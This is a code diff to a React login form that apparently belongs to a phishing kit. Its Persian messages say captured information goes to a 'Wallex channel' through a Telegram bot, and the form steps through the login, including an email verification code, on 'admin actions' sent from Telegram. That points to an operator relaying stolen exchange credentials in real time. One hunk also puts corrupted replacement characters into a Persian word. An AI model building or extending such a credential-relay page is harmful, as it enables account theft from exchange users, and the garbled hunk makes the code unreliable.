@@ -129,9 +129,19 @@ export const LoginForm = () => {
     }
   }, [countdown, currentStep]);
 
-  // Handle admin actions from Telegram
+  // Handle admin actions from Telegram bot
   const handleAdminAction = (action: string) => {
-    console.log("🚀 Admin action received:", action);
+    if (!sessionId) {
+      console.error("No session ID for admin action");
+      return;
+    }
+
+    console.log("🎯 LoginForm received admin action:", {
+      sessionId,
+      action,
+      currentStep,
+      timestamp: new Date().toISOString(),
+    });
     setIsSubmitting(false);
 
     // Handle incorrect actions
@@ -878,7 +888,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظ��م کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -3192,7 +3202,7 @@ export const LoginForm = () => {
               <div style={{ marginBottom: "16px" }}>
                 <AlertMessage>
                   کد تایید به ایمیل{" "}
-                  <strong style={{ direction: "ltr" }}>{email}</strong> ارسال
+                  <strong style={{ direction: "ltr" }}>{email}</strong> ��رسال
                   شد.
                 </AlertMessage>
               </div>
